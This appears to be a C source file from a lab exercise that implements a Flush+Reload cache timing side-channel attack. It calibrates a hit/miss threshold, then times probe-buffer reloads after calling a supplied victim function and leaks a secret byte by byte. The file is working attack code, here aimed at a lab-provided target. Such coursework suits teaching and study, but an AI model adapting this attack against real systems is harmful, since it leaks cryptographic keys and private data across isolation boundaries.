#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>

#include "asm.h"
#include "libcrypto/crypto.h"


#define NUM_SAMPLES 10000
#define NUM_ITERATIONS 1000
#define ROUNDS 10

 /*
     * ================ TASK 0 ================
     *               WITHOUT THE GRAPH
     * ========================================
     */


uint64_t measure_access(unsigned char* addr, int is_miss) {
    uint64_t min_time = UINT64_MAX;
    
    for(int i = 0; i < ROUNDS; i++) {
        if(is_miss) {
            clflush(addr);
        } else {
            *(volatile char*)addr; 
        }
        mfence();
        
        uint64_t start = rdtscp();
        *(volatile char*)addr;
        lfence();
        uint64_t end = rdtscp();
        
        uint64_t delta_t = end - start;
        if(delta_t < min_time) {
            min_time = delta_t;
        }
    }
    
    return min_time;
}



uint64_t get_cache_threshold(){

    uint64_t hits = 0;    
    uint64_t misses = 0;   
    uint64_t delta_t;

    unsigned char test_line[64];
    test_line[0] = 1;

    //HITS
    *(volatile char*)test_line;
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t =measure_access(test_line, 0);
        hits += delta_t;
    }

    //MISSES
    clflush(test_line);
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t=  measure_access(test_line, 1);
        misses += delta_t;
    }

    uint64_t hitt_avg = hits / NUM_SAMPLES;
    uint64_t miss_avg = misses / NUM_SAMPLES;
    uint64_t threshold = (miss_avg + hitt_avg) / 2;
 
    return threshold;
}
/*
     * ================ TASK 1 ================
     *               FLUSH + RELOAD 
     * ========================================
     */

uint64_t get_reload_time(unsigned char *addr) {

    mfence();
    uint64_t start = rdtscp();
    *(volatile char*)addr;
    lfence();
    uint64_t end = rdtscp();
    
    uint64_t delta_t = end - start;

    return delta_t;
}


int main(int argc, char *argv[]) {

    char leaked_secret[secret_length + 1];
    memset(leaked_secret, 0, (secret_length+1) * sizeof(char));

   
    int CACHE_THRESHOLD = get_cache_threshold();
    int STRIDE = 4096;                     // page size to confuse prefetcher
    int ITERATIONS = 1000;                
    int RELOADBUFFER_SIZE = 256 * STRIDE;

    unsigned char *reloadbuffer = aligned_alloc(4096, RELOADBUFFER_SIZE); //so it gets alligned at page size so it starts witha  fresh cache line 
                                                                            // from its start not in the middle of a cache line
    memset(reloadbuffer, 0, RELOADBUFFER_SIZE);     
    printf("CACHE THRESHOLD = %d cycles\n", CACHE_THRESHOLD);
    printf("secret_length = %d\n", secret_length);
    printf("reloads per byte = %d\n\n\n", NUM_ITERATIONS);

    // for each secret byte of the secret 
    for (int secret_byte = 0; secret_byte < secret_length; secret_byte++) {
        int all_bytes_hit_tracker[256] = {0};

        for (int i=0; i< NUM_ITERATIONS; i++) { //more measureaments for each byte

            // 1 Flush the entire buffer from cache (not entire cache btw)
            for (int i = 0; i < 256; i++) {
                clflush(&reloadbuffer[i * STRIDE]);
            }
            mfence();

            // 2 call the victim function
            encrypt_secret_byte(reloadbuffer, STRIDE, secret_byte);

            //3  try to access all bytes and see who is faster
            for(int j=0; j<256; j++){
                //printf("Checking byte value: %d\n", i);
                uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
                if(reload_time < CACHE_THRESHOLD){
                    all_bytes_hit_tracker[j]++;
                }
            }

        }

        int most_hit_byte = 0;
        int max = 0;
        for(int i=0; i<256; i++){
            if(all_bytes_hit_tracker[i] > max){
                max = all_bytes_hit_tracker[i];
                most_hit_byte = i;
            }
        }

        leaked_secret[secret_byte] = most_hit_byte;

        printf("Byte %d: 0x%02x ('%c') - hits %.1f%%\n", 
            secret_byte, most_hit_byte, most_hit_byte, 
            100.0 * max / NUM_ITERATIONS);

        



    }

    leaked_secret[secret_length] = '\0';  
    printf("\n=== SECRET ===\n");
    printf("Secret: %s\n", leaked_secret);

    free(reloadbuffer);

    return 0;
}